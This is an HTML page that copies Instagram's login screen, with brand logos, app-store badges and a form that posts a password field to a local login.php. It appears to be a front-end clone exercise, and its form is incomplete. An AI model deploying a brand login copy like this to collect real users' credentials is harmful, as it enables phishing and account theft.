<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram</title>
    <link rel="icon" href="https://img.icons8.com/?size=100&id=Xy10Jcu1L2Su&format=png&color=000000" type="icon">
    <link rel="stylesheet" href="style.css" />
</head>

<body>

    <div class="container">
        <div class="left-section">
            <img src="Images/mobileImage.jpeg" alt="">
        </div>
        <div class="right-section">
            <div class="box">
                <div class="login-box">
                    <img src="Images/instaTextLogo.png" alt="" class="instaTextLogo">
                </div>

                <div class="signin-box">
                    <form action="login.php" method="POST">
                        <input type="text" id="username" placeholder="Phone number, username, or email">
                        <input type="password" id="password" placeholder="Password" name="pas">
                    </form>
                    
                    <button class="loginbtn" id="loginbtn">Log in</button>

                    <div class="divider">
                        <hr class="line" />
                        <p>OR</p>
                        <hr class="line" />
                    </div>

                    <div class="login-with-facebook">
                        <img src="https://cdn0.iconfinder.com/data/icons/social-messaging-ui-color-shapes-2-free/128/social-facebook-2019-circle-512.png"
                            alt="" class="fb-img" />
                        <a href="#" class="facebook-login">Log in with Facebook</a>

                    </div>

                    <div>
                        <a href="#" class="forgot-password">Forgot password?</a>
                    </div>
                </div>
            </div>

            <div class="signup-box">
                <p>Don't have an account? <a href="register.html">Sign up</a></p>
            </div>


            <div class="download-section">
                <p>Get the app</p>
                <div class="app-btn">
                    <img src="Images/appstore.png" alt="" class="app-btn" />
                    <img src="Images//playstore.png" alt="" class="app-btn" />

                </div>
            </div>
        </div>
    </div>



</body>

</html>
